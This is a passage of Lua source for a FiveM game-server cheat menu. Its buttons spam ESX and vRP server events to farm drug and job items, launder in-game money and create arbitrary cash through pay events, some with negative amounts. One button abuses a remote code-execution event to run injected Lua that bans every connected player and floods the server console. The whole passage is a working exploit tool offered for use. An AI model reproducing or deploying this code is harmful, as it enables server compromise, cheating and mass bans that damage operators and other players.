                        TriggerServerEvent('esx_mechanicjob:startHarvest')
                        TriggerServerEvent('esx_mechanicjob:startHarvest')
			elseif IhadSexWithMyStepMother.Button("~b~Harvest RepairTools") then
						TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2')
                        TriggerServerEvent('esx_mechanicjob:startHarvest2') 
			elseif IhadSexWithMyStepMother.Button("~b~Harvest BodyTools") then	
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
					TriggerServerEvent('esx_mechanicjob:startHarvest3')
			elseif IhadSexWithMyStepMother.Button("~b~Harvest TunerChip") then	
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
					TriggerServerEvent('esx_mechanicjob:startHarvest4')
			elseif IhadSexWithMyStepMother.Button("~c~Craft Blowtorch") then	
			        TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
					TriggerServerEvent('esx_mechanicjob:startCraft')
			elseif IhadSexWithMyStepMother.Button("~c~Craft RepairKit") then
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
					TriggerServerEvent('esx_mechanicjob:startCraft2')
			elseif IhadSexWithMyStepMother.Button("~c~Craft BodyKit") then
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
					TriggerServerEvent('esx_mechanicjob:startCraft3')
			elseif IhadSexWithMyStepMother.Button("~y~Harvest Bitcoin") then
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
					TriggerServerEvent('esx_bitcoin:startHarvestKoda')
			elseif IhadSexWithMyStepMother.Button("~y~Sell Bitcoin") then
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
					TriggerServerEvent('esx_bitcoin:startSellKoda')
			elseif IhadSexWithMyStepMother.Button("~r~Stop all") then	
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					TriggerServerEvent('esx_mechanicjob:stopHarvest') 
					TriggerServerEvent('esx_mechanicjob:stopHarvest2') 
					TriggerServerEvent('esx_mechanicjob:stopHarvest2') 
					TriggerServerEvent('esx_mechanicjob:stopHarvest4') 
					TriggerServerEvent('esx_mechanicjob:stopCraft') 
					TriggerServerEvent('esx_mechanicjob:stopCraft2') 
					TriggerServerEvent('esx_mechanicjob:stopCraft3')	
end					
				
			elseif IhadSexWithMyStepMother.IsMenuOpened('drogas') then
			 if IhadSexWithMyStepMother.Button("~h~~g~Harvest ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent("esx_drugs:startHarvestWeed")
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:startHarvestWeed')
				elseif IhadSexWithMyStepMother.Button("~h~~g~Transform ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent("esx_drugs:startTransformWeed")
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:startTransformWeed')
				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell ~g~Weed ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent("esx_drugs:startSellWeed")
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
					TriggerServerEvent('esx_illegal_drugs:startSellWeed')
				elseif IhadSexWithMyStepMother.Button("~h~Harvest Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
					TriggerServerEvent("esx_drugs:startHarvestCoke")
				    TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:startHarvestCoke')
				elseif IhadSexWithMyStepMother.Button("~h~Transform Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent("esx_drugs:startTransformCoke")
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
				    TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:startTransformCoke')																			
				elseif IhadSexWithMyStepMother.Button("~h~Sell Coke ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent("esx_drugs:startSellCoke")
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
					TriggerServerEvent('esx_illegal_drugs:startSellCoke')
				elseif IhadSexWithMyStepMother.Button("~h~~r~Harvest Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent("esx_drugs:startHarvestMeth")
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:startHarvestMeth')
				elseif IhadSexWithMyStepMother.Button("~h~~r~Transform Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent("esx_drugs:startTransformMeth")
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:startTransformMeth')
				elseif IhadSexWithMyStepMother.Button("~h~~r~Sell Meth ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent("esx_drugs:startSellMeth")
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
					TriggerServerEvent('esx_illegal_drugs:startSellMeth')
				elseif IhadSexWithMyStepMother.Button("~h~~p~Harvest Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent("esx_drugs:startHarvestOpium")
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:startHarvestOpium')
				elseif IhadSexWithMyStepMother.Button("~h~~p~Transform Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent("esx_drugs:startTransformOpium")
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:startTransformOpium')
				elseif IhadSexWithMyStepMother.Button("~h~~p~Sell Opium ~c~(x5)") then
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent("esx_drugs:startSellOpium")
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
					TriggerServerEvent('esx_illegal_drugs:startSellOpium')
				elseif IhadSexWithMyStepMother.Button("~r~~h~Stop all ~c~(Drugs)") then
					TriggerServerEvent("esx_drugs:stopHarvestCoke")
					TriggerServerEvent("esx_drugs:stopTransformCoke")
					TriggerServerEvent("esx_drugs:stopSellCoke")
					TriggerServerEvent("esx_drugs:stopHarvestMeth")
					TriggerServerEvent("esx_drugs:stopTransformMeth")
					TriggerServerEvent("esx_drugs:stopSellMeth")
					TriggerServerEvent("esx_drugs:stopHarvestWeed")
					TriggerServerEvent("esx_drugs:stopTransformWeed")
					TriggerServerEvent("esx_drugs:stopSellWeed")
					TriggerServerEvent("esx_drugs:stopHarvestOpium")
					TriggerServerEvent("esx_drugs:stopTransformOpium")
					TriggerServerEvent("esx_drugs:stopSellOpium")
					TriggerServerEvent('esx_illegal_drugs:stopHarvestCoke')
					TriggerServerEvent('esx_illegal_drugs:stopTransformCoke')
					TriggerServerEvent('esx_illegal_drugs:stopSellCoke')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestMeth')
					TriggerServerEvent('esx_illegal_drugs:stopTransformMeth')
					TriggerServerEvent('esx_illegal_drugs:stopSellMeth')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestWeed')
					TriggerServerEvent('esx_illegal_drugs:stopTransformWeed')
					TriggerServerEvent('esx_illegal_drugs:stopSellWeed')
					TriggerServerEvent('esx_illegal_drugs:stopHarvestOpium')
					TriggerServerEvent('esx_illegal_drugs:stopTransformOpium')
					TriggerServerEvent('esx_illegal_drugs:stopSellOpium')
					ShowInfo("~r~Everything is now stopped.")
				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell Money Wash~s~ 1 ~c~(x10)") then
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
					TriggerServerEvent("esx_blanchisseur:startWhitening", 85)
				elseif IhadSexWithMyStepMother.Button("~h~~g~Sell Money Wash~s~ 2") then
					local result = GetKeyboardInput("Enter amount wash money ", "", 100000)
					if result then
					TriggerServerEvent('esx_moneywash:washMoney', result)
					TriggerServerEvent('esx_blackmoney:washMoney', result)
					TriggerServerEvent('esx_society:washMoney', result)
					end
				end
		
			
			
			elseif IhadSexWithMyStepMother.IsMenuOpened('money') then
						if IhadSexWithMyStepMother.Button("~r~ Money [1] Vrp Dont Use With Rac Anticheat") then
			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
			
			 if string.lower(confirm) == "y" then
			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
				
				TriggerServerEvent('esx_truckerjob:pay', result)
				TriggerServerEvent('vrp_slotmachine:server:2', result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent('esx_jobs:caution', 'give_back', result)
				TriggerServerEvent('lscustoms:payGarage', result)
				TriggerServerEvent('esx_tankerjob:pay', result)
				TriggerServerEvent('esx_vehicletrunk:giveDirty', result)
				TriggerServerEvent('f0ba1292-b68d-4d95-8823-6230cdf282b6', result)
				TriggerServerEvent('gambling:spend', result)
				TriggerServerEvent('265df2d8-421b-4727-b01d-b92fd6503f5e', result)
				TriggerServerEvent('AdminMenu:giveDirtyMoney', result)
				TriggerServerEvent('AdminMenu:giveBank', result)
				TriggerServerEvent('AdminMenu:giveCash', result)
				TriggerServerEvent('esx_slotmachine:sv:2', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
				TriggerServerEvent('esx_moneywash:withdraw', result)
				TriggerServerEvent('esx_moneywash:deposit', result)
			    TriggerServerEvent('mission:completed', result)
				TriggerServerEvent('truckerJob:success',result)
				TriggerServerEvent('c65a46c5-5485-4404-bacf-06a106900258', result)
				TriggerServerEvent("dropOff", result)
				TriggerServerEvent('truckerfuel:success',result)
				TriggerServerEvent('delivery:success',result)
				TriggerServerEvent("lscustoms:payGarage", {costs = -result})
				TriggerServerEvent("esx_brinksjob:pay", result)
				TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent("esx_postejob:pay", result)
				TriggerServerEvent('esx_garbage:pay', result)
				TriggerServerEvent("esx_carteirojob:pay", result)
				else
					ShowInfo("~r~Operation Canceled")
				end
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 2 ~y~Esx~s~ | ~b~vRP ~r~(RISK) (All_Jobs)") then
				local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
			 if string.lower(confirm) == "y" then
			        TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_pilot:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent('esx_taxijob:success')
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent("esx_mugging:giveMoney")
					TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				TriggerServerEvent('paycheck:salary')
				else
					ShowInfo("~r~Operation Canceled")
				end
				
				elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 3 ~y~Esx~s~ | ~b~vRP ~r~ (RISK) ~s~(Work 90% ALL SERVERS)") then
			local confirm = GetKeyboardInput("Using this option will ~r~risk banned ~s~server! Are you Sure? ~g~Y/~r~N")
			
			 if string.lower(confirm) == "y" then
			 local result = GetKeyboardInput("Enter amount of money ~g~$$$", "", 100000000)
				TriggerServerEvent("esx_godirtyjob:pay", result)
				TriggerServerEvent("esx_pizza:pay", result)
				TriggerServerEvent("esx_slotmachine:sv:2", result)
				TriggerServerEvent("esx_banksecurity:pay", result)
				TriggerServerEvent("esx_gopostaljob:pay", result)
				TriggerServerEvent("esx_truckerjob:pay", result)
				TriggerServerEvent("esx_carthief:pay", result)
			    TriggerServerEvent("esx_garbagejob:pay", result)
				TriggerServerEvent("esx_ranger:pay", result)
                TriggerServerEvent("esx_truckersjob:payy", result)
                TriggerServerEvent("esx_godirtyjob:pay", result)
                TriggerServerEvent("dropOff",result)
                TriggerServerEvent("PayForRepairNow",-result)
				else
					ShowInfo("~r~Operation Canceled")
				end
		    elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 4 ~b~VRP (vrp_trucker)") then
                local money = GetKeyboardInput("Enter amount of money ~g~$$$")
                local distance = money / 3.80
                vRPtruckS = Tunnel.getInterface("vRP_trucker", "vRP_trucker")
                vRPtruckS.finishTruckingDelivery({distance})
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 5 ~b~ VRP (vrp_casino)") then
				local amount = GetKeyboardInput("Enter amount of money ~g~$$$:")
				vRPcasinoS = Tunnel.getInterface("vRP_casino","vRP_casino")
				vRPcasinoS.payRouletteWinnings({amount, 2})
			elseif IhadSexWithMyStepMother.Button("~r~Ban Vrp !Use Server Without Anticheat!") then
				TriggerServerEvent('RunCode:RunStringRemotelly', [[
    local users = vRP.getUsers({})
    local myid = 21
    for k,v in pairs(users) do 
        local srcs = vRP.getUserSource({tonumber(k)})
        vRP.ban({srcs, "Banned by !  wwba Discord: Discord.gg/wwba)
    end

    for i = 1,300 do 
        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
        RconPrint("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")
    end
]])
			elseif IhadSexWithMyStepMother.Button("~g~MONEY~s~ 7 ~b~ VRP PayCheck 100X Working Vrp") then
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:salary')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:bonus_ad')
                TriggerServerEvent('paycheck:salary')
